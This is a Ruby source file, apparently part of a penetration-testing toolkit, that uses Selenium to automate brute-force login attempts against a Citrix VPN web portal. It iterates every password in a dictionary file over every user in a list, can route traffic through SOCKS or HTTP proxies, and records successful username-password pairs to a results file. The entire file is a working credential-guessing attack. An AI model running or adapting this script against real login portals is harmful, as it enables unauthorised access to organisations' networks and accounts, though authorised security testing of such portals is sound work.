begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install \"gem intall selenium-webdriver\""
end



class Citrix_vpn #< Logical_Chaos
	def initialize(host,path,file,password,result_file,proxy,http_proxy)
		
			@base_url = host 
			@path = path
			
			if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
				  # No proxy
				  @driver = Selenium::WebDriver.for :firefox
				else
  				# Firefox profile configure HTTP(S) proxy
  				
  				proxy_info = http_proxy.split(":")
  				profile['network.proxy.http'] = proxy_info[0].to_s
  				profile['network.proxy.http_port'] = proxy_info[1].to_i
  				profile['network.proxy.ssl'] = proxy_info[0].to_s
  				profile['network.proxy.ssl_port'] = proxy_info[1].to_i
  				profile['network.proxy.type'] = 1
  				@driver = Selenium::WebDriver.for :firefox, :profile => profile
  			end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 10
			@verification_errors = []
			
			# Provide a file with a list of users 
			@file= file
			
			# Password file to use
			puts @password
			@password = password
			
			# Provide a result file where valid users and passwords will be stored
			@result_file = result_file
		
	end
	
	def brute_user_password
		begin
			
			f = nil
			p = ""
			if File.exists?(@password.to_s)
				p = File.new(@password,'r+')
			  puts @password
			else
				p = File.new('dictionaries/passwd1','r+')
			end

			p.each do |passwd|
			  f = File.new(@file,'r+')
				f.each do |user|
					user = user.to_s.strip
					passwd = passwd.to_s.strip
					puts "Testing User:#{user} Password:#{passwd}"
					@driver.get(@base_url + @path)
					@driver.find_element(:name, "login").clear
					@driver.find_element(:name, "login").send_keys user.to_s
					@driver.find_element(:name, "passwd").clear
					@driver.find_element(:name, "passwd").send_keys passwd.to_s
					@driver.find_element(:id,"Log_On").click
					if is_alert_present?	
						puts "Alert present"
					end
					if element_present?(:name,"passwd")
						#Wrong password
						@driver.manage.delete_all_cookies
					else
						result = File.new(@result_file,'a+')
						puts "Yeah!!!!!!!!!!!!!! Correct password!   User:#{user} Password:#{passwd}"						
						@driver.manage.delete_all_cookies
						result.puts "User:#{user} Password:#{passwd}"
						result.close
					end
					#@driver.save_screenshot("citrix_#{user.to_s}_#{passwd.to_s}.png")
				end
				f.close
			end
			p.close
		rescue Exception => e
			#puts "Error with User:#{user} Password:#{passwd}"
			#result.puts "Error with user :#{user} Password:#{@password}"
			puts e.message  
			#puts e.backtrace.inspect
		end
		@driver.quit
	end
	
	def read_file
		f = File.new(@file,'r+')
		f.each do |line|
			puts line
		end
		f.close
	end
	
	def element_present?(how, what)
		begin
			@driver.find_element(how, what)
			true
		rescue Exception => e
			false
		end
	end
	
	def is_alert_present?()
		begin
			@driver.switch_to.alert.dismiss
			true
		rescue Exception => e
			false
		end
	end
  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end
